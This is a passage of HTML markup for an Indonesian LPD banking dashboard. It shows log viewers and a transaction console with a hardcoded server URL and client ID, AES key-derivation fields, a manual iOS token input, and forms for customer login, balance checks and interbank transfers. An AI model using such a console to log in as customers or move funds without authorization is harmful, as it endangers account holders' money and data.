        <div class="sc-icon" style="background:#0d3b37"><i class="fas fa-sign-in-alt" style="color:#14b8a6"></i></div>
        <div class="sc-val" id="stat-total-access">\u2014</div>
        <div class="sc-label">Total Login Hari Ini</div>
        <div class="sc-sub" id="stat-access-sub">memuat...</div>
      </div>
      <div class="stat-card">
        <div class="sc-icon" style="background:#1e1b4b"><i class="fas fa-exchange-alt" style="color:#a78bfa"></i></div>
        <div class="sc-val" id="stat-total-transfer">\u2014</div>
        <div class="sc-label">Transfer Hari Ini</div>
        <div class="sc-sub" id="stat-transfer-sub">memuat...</div>
      </div>
      <div class="stat-card">
        <div class="sc-icon" style="background:#022c22"><i class="fas fa-key" style="color:#34d399"></i></div>
        <div class="sc-val" id="stat-total-token">\u2014</div>
        <div class="sc-label">Token Request Hari Ini</div>
        <div class="sc-sub" id="stat-token-sub">memuat...</div>
      </div>
      <div class="stat-card">
        <div class="sc-icon" style="background:#1c0d00"><i class="fas fa-exclamation-triangle" style="color:#f97316"></i></div>
        <div class="sc-val" id="stat-total-errors">\u2014</div>
        <div class="sc-label">Error 7 Hari</div>
        <div class="sc-sub" id="stat-error-sub">memuat...</div>
      </div>
    </div>

    <div class="grid-2" style="margin-bottom:16px">
      <div class="panel">
        <div class="panel-header">
          <div class="panel-header-left">
            <h3><i class="fas fa-sign-in-alt mr-2"></i>Login Terbaru</h3>
            <span class="badge" id="badge-recent-access">\u2014</span>
          </div>
          <button class="btn btn-secondary btn-sm" onclick="showSection('logs-access')">Lihat Semua</button>
        </div>
        <div class="panel-body" style="padding:0">
          <table class="data-table">
            <thead><tr><th>Waktu</th><th>Endpoint</th><th>Status</th></tr></thead>
            <tbody id="recent-access-body">
              <tr><td colspan="3" class="text-center" style="padding:16px;color:#475569">Memuat...</td></tr>
            </tbody>
          </table>
        </div>
      </div>
      <div class="panel">
        <div class="panel-header">
          <div class="panel-header-left">
            <h3><i class="fas fa-exchange-alt mr-2"></i>Transfer Terbaru</h3>
            <span class="badge" id="badge-recent-transfer">\u2014</span>
          </div>
          <button class="btn btn-secondary btn-sm" onclick="showSection('logs-transfer')">Lihat Semua</button>
        </div>
        <div class="panel-body" style="padding:0">
          <table class="data-table">
            <thead><tr><th>Waktu</th><th>Endpoint</th><th>Nominal</th></tr></thead>
            <tbody id="recent-transfer-body">
              <tr><td colspan="3" class="text-center" style="padding:16px;color:#475569">Memuat...</td></tr>
            </tbody>
          </table>
        </div>
      </div>
    </div>

    <div class="panel">
      <div class="panel-header">
        <div class="panel-header-left">
          <h3><i class="fas fa-history mr-2"></i>File Log Tersedia</h3>
        </div>
      </div>
      <div class="panel-body" id="log-files-overview">
        <div style="color:#475569;font-size:12px">Memuat...</div>
      </div>
    </div>

  </div>

  <!-- \u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550
       SECTION: AKTIVITAS HARIAN
  \u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550 -->
  <div id="section-activity" class="section content">
    <div class="section-title"><i class="fas fa-chart-line"></i> Aktivitas Harian \u2014 Request per Jam</div>

    <div class="panel" style="margin-bottom:16px">
      <div class="panel-header">
        <div class="panel-header-left">
          <h3><i class="fas fa-calendar mr-2"></i>Pilih Tanggal & Tipe Log</h3>
        </div>
        <button class="btn btn-primary btn-sm" onclick="loadActivity()"><i class="fas fa-search"></i> Load</button>
      </div>
      <div class="panel-body">
        <div class="grid-3">
          <div class="field-row">
            <label>Tanggal</label>
            <input type="date" id="act-date" />
          </div>
          <div class="field-row">
            <label>Tipe Log</label>
            <select id="act-type">
              <option value="access">Access (Login/Logout)</option>
              <option value="transfer-AR">Transfer Bank (AR)</option>
              <option value="transfer-AB">Transfer LPD (AB)</option>
              <option value="tabungan">Tabungan / Mutasi</option>
              <option value="token">Token SNAP</option>
            </select>
          </div>
          <div class="field-row">
            <label>Filter Endpoint</label>
            <input type="text" id="act-filter" placeholder="cth: login, transfer, inquiry" />
          </div>
        </div>
      </div>
    </div>

    <div class="grid-2" style="margin-bottom:16px">
      <div class="panel">
        <div class="panel-header"><div class="panel-header-left"><h3>Request Per Jam</h3><span class="badge" id="badge-act-total">0</span></div></div>
        <div class="panel-body"><div class="chart-container"><canvas id="chart-hourly"></canvas></div></div>
      </div>
      <div class="panel">
        <div class="panel-header"><div class="panel-header-left"><h3>Distribusi Endpoint</h3></div></div>
        <div class="panel-body"><div class="chart-container"><canvas id="chart-endpoint"></canvas></div></div>
      </div>
    </div>

    <div class="panel">
      <div class="panel-header">
        <div class="panel-header-left"><h3><i class="fas fa-list mr-2"></i>Log Entries</h3><span class="badge" id="badge-act-entries">0</span></div>
      </div>
      <div class="panel-body" style="padding:0">
        <div id="activity-log-list" style="padding:12px"></div>
      </div>
    </div>
  </div>

  <!-- \u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550
       SECTION: LOG AKSES
  \u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550 -->
  <div id="section-logs-access" class="section content">
    <div class="section-title"><i class="fas fa-sign-in-alt"></i> Log Akses Nasabah</div>
    <div class="panel" style="margin-bottom:12px">
      <div class="panel-header"><div class="panel-header-left"><h3>Filter</h3></div>
        <button class="btn btn-primary btn-sm" onclick="loadAccessLogs()"><i class="fas fa-search"></i> Cari</button>
      </div>
      <div class="panel-body">
        <div class="grid-3">
          <div class="field-row"><label>Tanggal</label><input type="date" id="acc-date"/></div>
          <div class="field-row"><label>Sumber File</label>
            <select id="acc-source">
              <option value="root">Root (access-YYYY-MM-DD.txt)</option>
              <option value="his">his/ (access-YYYY-MM-DD.txt)</option>
            </select>
          </div>
          <div class="field-row"><label>Cari Teks</label><input type="text" id="acc-search" placeholder="endpoint, username hash, ..."/></div>
        </div>
      </div>
    </div>
    <div class="panel">
      <div class="panel-header">
        <div class="panel-header-left"><h3><i class="fas fa-list-alt mr-2"></i>Log Entries</h3><span class="badge" id="badge-acc-count">0</span></div>
      </div>
      <div id="access-log-list" style="padding:12px"></div>
    </div>
  </div>

  <!-- \u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550
       SECTION: LOG TRANSFER
  \u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550 -->
  <div id="section-logs-transfer" class="section content">
    <div class="section-title"><i class="fas fa-exchange-alt"></i> Log Transfer</div>
    <div class="panel" style="margin-bottom:12px">
      <div class="panel-header"><div class="panel-header-left"><h3>Filter</h3></div>
        <button class="btn btn-primary btn-sm" onclick="loadTransferLogs()"><i class="fas fa-search"></i> Cari</button>
      </div>
      <div class="panel-body">
        <div class="grid-3">
          <div class="field-row"><label>Tanggal</label><input type="date" id="tr-date"/></div>
          <div class="field-row"><label>Tipe Transfer</label>
            <select id="tr-type">
              <option value="AR">Transfer Bank Antar (AR)</option>
              <option value="AB">Transfer LPD Antar (AB)</option>
              <option value="in">Transfer In (Masuk)</option>
            </select>
          </div>
          <div class="field-row"><label>Sumber</label>
            <select id="tr-source">
              <option value="root">Root</option>
              <option value="his">his/</option>
            </select>
          </div>
        </div>
        <div class="field-row"><label>Cari Teks</label><input type="text" id="tr-search" placeholder="endpoint, reference, ..."/></div>
      </div>
    </div>
    <div class="panel">
      <div class="panel-header">
        <div class="panel-header-left"><h3><i class="fas fa-list-alt mr-2"></i>Log Entries</h3><span class="badge" id="badge-tr-count">0</span></div>
      </div>
      <div id="transfer-log-list" style="padding:12px"></div>
    </div>
  </div>

  <!-- \u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550
       SECTION: LOG TABUNGAN
  \u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550 -->
  <div id="section-logs-tabungan" class="section content">
    <div class="section-title"><i class="fas fa-piggy-bank"></i> Log Tabungan & Mutasi</div>
    <div class="panel" style="margin-bottom:12px">
      <div class="panel-header"><div class="panel-header-left"><h3>Filter</h3></div>
        <button class="btn btn-primary btn-sm" onclick="loadTabunganLogs()"><i class="fas fa-search"></i> Cari</button>
      </div>
      <div class="panel-body">
        <div class="grid-2">
          <div class="field-row"><label>Tanggal</label><input type="date" id="tab-date"/></div>
          <div class="field-row"><label>Cari Teks</label><input type="text" id="tab-search" placeholder="customer_id, endpoint..."/></div>
        </div>
      </div>
    </div>
    <div class="panel">
      <div class="panel-header">
        <div class="panel-header-left"><h3><i class="fas fa-list-alt mr-2"></i>Log Entries</h3><span class="badge" id="badge-tab-count">0</span></div>
      </div>
      <div id="tabungan-log-list" style="padding:12px"></div>
    </div>
  </div>

  <!-- \u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550
       SECTION: LOG TOKEN
  \u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550 -->
  <div id="section-logs-token" class="section content">
    <div class="section-title"><i class="fas fa-key"></i> Log Token / SNAP B2B</div>
    <div class="panel" style="margin-bottom:12px">
      <div class="panel-header"><div class="panel-header-left"><h3>Filter</h3></div>
        <button class="btn btn-primary btn-sm" onclick="loadTokenLogs()"><i class="fas fa-search"></i> Cari</button>
      </div>
      <div class="panel-body">
        <div class="grid-3">
          <div class="field-row"><label>Tanggal</label><input type="date" id="tok-date"/></div>
          <div class="field-row"><label>Tipe</label>
            <select id="tok-type">
              <option value="root">Root (token-YYYY-MM-DD.txt)</option>
              <option value="token-dir">token/ (request-YYYY-MM-DD.log)</option>
            </select>
          </div>
          <div class="field-row"><label>Cari Teks</label><input type="text" id="tok-search" placeholder="accessToken, responseCode..."/></div>
        </div>
      </div>
    </div>
    <div class="panel">
      <div class="panel-header">
        <div class="panel-header-left"><h3><i class="fas fa-list-alt mr-2"></i>Log Entries</h3><span class="badge" id="badge-tok-count">0</span></div>
      </div>
      <div id="token-log-list" style="padding:12px"></div>
    </div>
  </div>

  <!-- \u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550
       SECTION: STATISTIK
  \u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550 -->
  <div id="section-stats" class="section content">
    <div class="section-title"><i class="fas fa-chart-bar"></i> Statistik API</div>
    <div class="info-box info-teal">
      <i class="fas fa-info-circle"></i>
      Statistik dihitung dari file log yang tersedia di storage Laravel.
      Data diambil secara real-time dari server.
    </div>

    <div class="grid-2" style="margin-bottom:16px">
      <div class="panel">
        <div class="panel-header"><div class="panel-header-left"><h3>Top Endpoints (7 Hari)</h3></div></div>
        <div class="panel-body" id="stats-endpoints">
          <div style="color:#475569;text-align:center;padding:20px">Memuat...</div>
        </div>
      </div>
      <div class="panel">
        <div class="panel-header"><div class="panel-header-left"><h3>Aktivitas Per Hari (30 Hari)</h3></div></div>
        <div class="panel-body"><div class="chart-container"><canvas id="chart-daily"></canvas></div></div>
      </div>
    </div>

    <div class="panel">
      <div class="panel-header">
        <div class="panel-header-left"><h3>Daftar File Log</h3></div>
        <button class="btn btn-primary btn-sm" onclick="loadStats()"><i class="fas fa-sync-alt"></i> Refresh</button>
      </div>
      <div class="panel-body" style="padding:0">
        <table class="data-table">
          <thead><tr><th>File</th><th>Direktori</th><th>Ukuran</th><th>Entri</th></tr></thead>
          <tbody id="stats-files-body">
            <tr><td colspan="4" style="text-align:center;padding:16px;color:#475569">Memuat...</td></tr>
          </tbody>
        </table>
      </div>
    </div>
  </div>

  <!-- \u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550
       SECTION: ERROR LOG
  \u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550 -->
  <div id="section-errors" class="section content">
    <div class="section-title"><i class="fas fa-exclamation-triangle"></i> Error Log Laravel</div>
    <div class="panel" style="margin-bottom:12px">
      <div class="panel-header"><div class="panel-header-left"><h3>Filter</h3></div>
        <button class="btn btn-primary btn-sm" onclick="loadErrors()"><i class="fas fa-search"></i> Cari</button>
      </div>
      <div class="panel-body">
        <div class="grid-2">
          <div class="field-row"><label>Level</label>
            <select id="err-level">
              <option value="all">Semua</option>
              <option value="ERROR">ERROR</option>
              <option value="WARNING">WARNING</option>
              <option value="INFO">INFO</option>
            </select>
          </div>
          <div class="field-row"><label>Cari Teks</label><input type="text" id="err-search" placeholder="SQLSTATE, Exception, ..."/></div>
        </div>
      </div>
    </div>
    <div class="panel">
      <div class="panel-header">
        <div class="panel-header-left"><h3><i class="fas fa-bug mr-2"></i>Laravel Error Log</h3><span class="badge" id="badge-err-count">0</span></div>
      </div>
      <div id="error-log-list" style="padding:12px"></div>
    </div>
  </div>

  <!-- \u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550
       SECTION: TRANSAKSI
  \u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550 -->
  <div id="section-trx" class="section content">
    <div class="section-title"><i class="fas fa-terminal"></i> Jalankan Transaksi Smart API</div>
    <div class="info-box info-teal" style="margin-bottom:14px">
      <i class="fas fa-info-circle"></i>
      <div>Lakukan transaksi langsung ke server LPD. Semua data dienkripsi AES-256-CBC sebelum dikirim.
      Alur: <strong>1. Setup Sesi</strong> \u2192 <strong>2. Login</strong> \u2192 <strong>3. Pilih Transaksi</strong> \u2192 <strong>4. Posting</strong></div>
    </div>

    <!-- Step 1: Session Setup -->
    <div class="panel" style="border-left:3px solid #14b8a6">
      <div class="panel-header">
        <div class="panel-header-left">
          <span style="background:#14b8a6;color:#0f172a;width:22px;height:22px;border-radius:50%;display:flex;align-items:center;justify-content:center;font-weight:800;font-size:11px;flex-shrink:0">1</span>
          <h3><i class="fas fa-key mr-2"></i>Setup Sesi (Derive Keys)</h3>
          <span class="badge" id="trx-session-badge">Belum aktif</span>
        </div>
        <div style="display:flex;gap:8px">
          <button class="btn btn-secondary btn-sm" onclick="trxAutoSetup()"><i class="fas fa-magic"></i> Auto Setup</button>
          <button class="btn btn-secondary btn-sm" onclick="trxGetFreshToken(true)"><i class="fas fa-sync-alt"></i> Refresh Token</button>
        </div>
      </div>
      <div class="panel-body">
        <div class="grid-2">
          <div>
            <div class="field-row"><label>Client ID Raw</label><input type="text" id="trx-clientid" value="AQ3A.240912.001.01102025120205"/></div>
            <div class="field-row"><label>Base URL Server</label><input type="text" id="trx-baseurl" value="https://lpdseminyak.biz.id:8000"/></div>
          </div>
          <div>
            <div class="field-row"><label>Client ID Encoded (X-CLIENT-ID)</label><input type="text" id="trx-clientid-enc" placeholder="Otomatis dari Auto Setup..."/></div>
            <div class="field-row"><label>Timestamp Sesi</label><input type="text" id="trx-session-ts" placeholder="Otomatis dari Auto Setup..."/></div>
          </div>
        </div>
        <div class="grid-2" style="margin-top:6px">
          <div><div class="field-row"><label>AES Key (Base64)</label><input type="text" id="trx-aeskey" placeholder="Otomatis dari Auto Setup..."/></div></div>
          <div><div class="field-row"><label>AES IV (Base64)</label><input type="text" id="trx-aesiv" placeholder="Otomatis dari Auto Setup..."/></div></div>
        </div>
        <div class="field-row" style="margin-top:6px"><label>AES CS (Base64)</label><input type="text" id="trx-aescs" placeholder="Otomatis dari Auto Setup..."/></div>
        <div style="margin-top:10px;display:flex;align-items:center;gap:10px">
          <span style="font-size:10px;color:#64748b;text-transform:uppercase;letter-spacing:.5px;font-weight:700">Status Token iOS:</span>
          <span id="trx-token-status"><span class="badge-pill badge-err">Belum ada token</span></span>
        </div>
        <div class="field-row" style="margin-top:8px">
          <label>Token iOS Manual (jika Auto gagal)</label>
          <div style="display:flex;gap:6px">
            <input type="text" id="trx-ios-token-manual" placeholder="Paste token iOS manual di sini jika Auto Setup gagal ambil token..." style="flex:1;font-size:11px"/>
            <button class="btn btn-secondary btn-sm" onclick="trxSetManualToken()" title="Gunakan token manual yang di-paste"><i class="fas fa-check"></i> Pakai</button>
          </div>
        </div>
        <div id="trx-setup-result" style="margin-top:10px;display:none"></div>
      </div>
    </div>

    <!-- Step 2: Login -->
    <div class="panel" style="border-left:3px solid #a78bfa">
      <div class="panel-header">
        <div class="panel-header-left">
          <span style="background:#a78bfa;color:#0f172a;width:22px;height:22px;border-radius:50%;display:flex;align-items:center;justify-content:center;font-weight:800;font-size:11px;flex-shrink:0">2</span>
          <h3><i class="fas fa-sign-in-alt mr-2"></i>Login Nasabah</h3>
          <span class="badge" id="trx-login-badge">Belum login</span>
        </div>
        <button class="btn btn-primary btn-sm" onclick="trxLogin()"><i class="fas fa-sign-in-alt"></i> Login</button>
      </div>
      <div class="panel-body">
        <div class="grid-2">
          <div><div class="field-row"><label>Username</label><input type="text" id="trx-username" placeholder="username nasabah"/></div></div>
          <div><div class="field-row"><label>Password (plain atau MD5)</label><input type="text" id="trx-password" placeholder="password nasabah"/></div></div>
        </div>
        <div id="trx-login-result" style="margin-top:10px;display:none"></div>
      </div>
    </div>

    <!-- Nasabah Info Panel (muncul setelah login sukses) -->
    <div id="trx-nasabah-panel" class="panel" style="display:none;border-left:3px solid #34d399;margin-bottom:16px">
      <div class="panel-header">
        <div class="panel-header-left">
          <i class="fas fa-user-circle" style="font-size:18px;color:#34d399"></i>
          <h3><i class="fas fa-id-card mr-2"></i>Info Nasabah</h3>
          <span class="badge" id="trx-nb-rekcount">0 rekening</span>
        </div>
        <div style="display:flex;align-items:center;gap:10px">
          <div style="text-align:right">
            <div style="font-size:13px;font-weight:800;color:#34d399" id="trx-nb-nama">\u2014</div>
            <div style="font-size:10px;color:#64748b">User: <span id="trx-nb-user">\u2014</span></div>
          </div>
        </div>
      </div>
      <div class="panel-body" style="padding:0">
        <table class="data-table">
          <thead>
            <tr>
              <th>No. Rekening</th>
              <th>Nama</th>
              <th>Produk</th>
              <th style="text-align:right">Saldo</th>
              <th>Aksi</th>
            </tr>
          </thead>
          <tbody id="trx-nb-accounts">
            <tr><td colspan="5" style="padding:16px;text-align:center;color:#475569">Login terlebih dahulu</td></tr>
          </tbody>
        </table>
      </div>
    </div>

    <!-- Step 3: Select Operation -->
    <div class="panel" style="border-left:3px solid #fbbf24">
      <div class="panel-header">
        <div class="panel-header-left">
          <span style="background:#fbbf24;color:#0f172a;width:22px;height:22px;border-radius:50%;display:flex;align-items:center;justify-content:center;font-weight:800;font-size:11px;flex-shrink:0">3</span>
          <h3><i class="fas fa-list mr-2"></i>Pilih Operasi</h3>
        </div>
      </div>
      <div class="panel-body">
        <div class="grid-4" style="margin-bottom:12px">
          <button class="btn btn-secondary" onclick="trxShowOp('cek-saldo')"><i class="fas fa-wallet"></i> Cek Saldo</button>
          <button class="btn btn-secondary" onclick="trxShowOp('account-list')"><i class="fas fa-list-alt"></i> Daftar Rekening</button>
          <button class="btn btn-secondary" onclick="trxShowOp('mutasi')"><i class="fas fa-history"></i> Mutasi</button>
          <button class="btn btn-secondary" onclick="trxShowOp('transfer-lpd')"><i class="fas fa-building mr-1"></i> Transfer LPD</button>
          <button class="btn btn-secondary" onclick="trxShowOp('transfer-bank')"><i class="fas fa-university mr-1"></i> Transfer Bank</button>
          <button class="btn btn-secondary" onclick="trxShowOp('logout')"><i class="fas fa-sign-out-alt"></i> Logout</button>
        </div>

        <!-- CEK SALDO -->
        <div id="trx-op-cek-saldo" class="trx-op-panel" style="display:none">
          <div class="separator"></div>
          <div class="section-title" style="margin-bottom:8px"><i class="fas fa-wallet"></i> Cek Saldo Rekening</div>
          <div class="field-row"><label>Nomor Rekening</label><input type="text" id="trx-cs-norek" placeholder="e.g. 2010123456"/></div>
          <button class="btn btn-primary" onclick="trxExec('cek-saldo')"><i class="fas fa-search"></i> Cek Saldo</button>
          <div id="trx-result-cek-saldo" style="margin-top:10px;display:none"></div>
        </div>

        <!-- ACCOUNT LIST -->
        <div id="trx-op-account-list" class="trx-op-panel" style="display:none">
          <div class="separator"></div>
          <div class="section-title" style="margin-bottom:8px"><i class="fas fa-list-alt"></i> Daftar Rekening Nasabah</div>
          <div class="field-row"><label>Customer ID</label><input type="text" id="trx-al-custid" placeholder="e.g. 12345"/></div>
          <button class="btn btn-primary" onclick="trxExec('account-list')"><i class="fas fa-search"></i> Cari Rekening</button>
          <div id="trx-result-account-list" style="margin-top:10px;display:none"></div>
        </div>

        <!-- MUTASI HISTORY -->
        <div id="trx-op-mutasi" class="trx-op-panel" style="display:none">
          <div class="separator"></div>
          <div class="section-title" style="margin-bottom:8px"><i class="fas fa-history"></i> Riwayat Mutasi</div>
          <div class="grid-2">
            <div><div class="field-row"><label>Nomor Rekening</label><input type="text" id="trx-mu-norek" placeholder="e.g. 2010123456"/></div></div>
            <div><div class="field-row"><label>Customer ID</label><input type="text" id="trx-mu-custid" placeholder="e.g. 12345"/></div></div>
            <div><div class="field-row"><label>Tanggal Awal</label><input type="date" id="trx-mu-tglawal"/></div></div>
            <div><div class="field-row"><label>Tanggal Akhir</label><input type="date" id="trx-mu-tglakhir"/></div></div>
          </div>
          <div style="display:flex;gap:8px;margin-top:4px">
            <button class="btn btn-primary" onclick="trxExec('mutasi-history')"><i class="fas fa-history"></i> Cek Mutasi</button>
            <button class="btn btn-secondary" onclick="trxExec('transaction-history')"><i class="fas fa-list"></i> Riwayat Transaksi</button>
          </div>
          <div id="trx-result-mutasi-history" style="margin-top:10px;display:none"></div>
          <div id="trx-result-transaction-history" style="margin-top:10px;display:none"></div>
        </div>

        <!-- TRANSFER LPD -->
        <div id="trx-op-transfer-lpd" class="trx-op-panel" style="display:none">
          <div class="separator"></div>
          <div class="section-title" style="margin-bottom:8px"><i class="fas fa-building"></i> Transfer Sesama LPD</div>
          <div class="grid-2">
            <div><div class="field-row"><label>Rekening Sumber</label><input type="text" id="trx-tlpd-from" placeholder="No rekening pengirim"/></div></div>
            <div>
              <div class="field-row">
                <label>Rekening Tujuan</label>
                <div style="display:flex;gap:6px">
                  <input type="text" id="trx-tlpd-to" placeholder="No rekening tujuan"/>
                  <button class="btn btn-secondary btn-sm" onclick="trxExec('transfer-lpd-check')" style="white-space:nowrap"><i class="fas fa-search"></i> Cek</button>
                </div>
              </div>
              <div id="trx-result-transfer-lpd-check" style="margin-bottom:8px;display:none"></div>
            </div>
            <div><div class="field-row"><label>Nama Tujuan</label><input type="text" id="trx-tlpd-name" placeholder="Nama pemilik rekening"/></div></div>
            <div><div class="field-row"><label>Nominal (Rp)</label><input type="text" id="trx-tlpd-nominal" placeholder="e.g. 100000"/></div></div>
            <div><div class="field-row"><label>Keterangan</label><input type="text" id="trx-tlpd-ket" placeholder="Pembayaran..."/></div></div>
          </div>
          <div style="display:flex;gap:8px;margin-top:8px">
            <button class="btn btn-secondary" onclick="trxExec('transfer-lpd-inquiry')"><i class="fas fa-check-circle"></i> Inquiry</button>
            <button class="btn btn-primary" onclick="trxConfirmPosting('transfer-lpd-posting')"><i class="fas fa-paper-plane"></i> Posting</button>
          </div>
          <div id="trx-result-transfer-lpd-inquiry" style="margin-top:10px;display:none"></div>
          <div id="trx-result-transfer-lpd-posting" style="margin-top:10px;display:none"></div>
        </div>

        <!-- TRANSFER BANK -->
        <div id="trx-op-transfer-bank" class="trx-op-panel" style="display:none">
          <div class="separator"></div>
          <div class="section-title" style="margin-bottom:8px"><i class="fas fa-university"></i> Transfer ke Bank Lain</div>
          <div class="grid-2">
            <div><div class="field-row"><label>Rekening Sumber</label><input type="text" id="trx-tbank-from" placeholder="No rekening pengirim"/></div></div>
            <div>
              <div class="field-row">
                <label>Rekening Tujuan</label>
                <div style="display:flex;gap:6px">
                  <input type="text" id="trx-tbank-to" placeholder="No rekening tujuan"/>
                  <button class="btn btn-secondary btn-sm" onclick="trxExec('transfer-bank-check')" style="white-space:nowrap"><i class="fas fa-search"></i> Cek</button>
                </div>
              </div>
              <div id="trx-result-transfer-bank-check" style="margin-bottom:8px;display:none"></div>
            </div>
            <div>
              <div class="field-row"><label>Kode Bank</label>
                <select id="trx-tbank-kode">
                  <option value="">-- Pilih Bank --</option>
                  <option value="014">BCA (014)</option>
                  <option value="008">Mandiri (008)</option>
                  <option value="009">BNI (009)</option>
                  <option value="002">BRI (002)</option>
                  <option value="022">CIMB Niaga (022)</option>
                  <option value="011">Danamon (011)</option>
                  <option value="016">BII Maybank (016)</option>
                  <option value="013">Permata (013)</option>
                  <option value="023">UOB (023)</option>
                  <option value="028">OCBC NISP (028)</option>
                  <option value="147">Muamalat (147)</option>
                  <option value="451">BSI (451)</option>
                  <option value="110">BJB (110)</option>
                  <option value="112">BPD Bali (112)</option>
                  <option value="111">DKI (111)</option>
                </select>
              </div>
            </div>
            <div><div class="field-row"><label>Nominal (Rp)</label><input type="text" id="trx-tbank-nominal" placeholder="e.g. 100000"/></div></div>
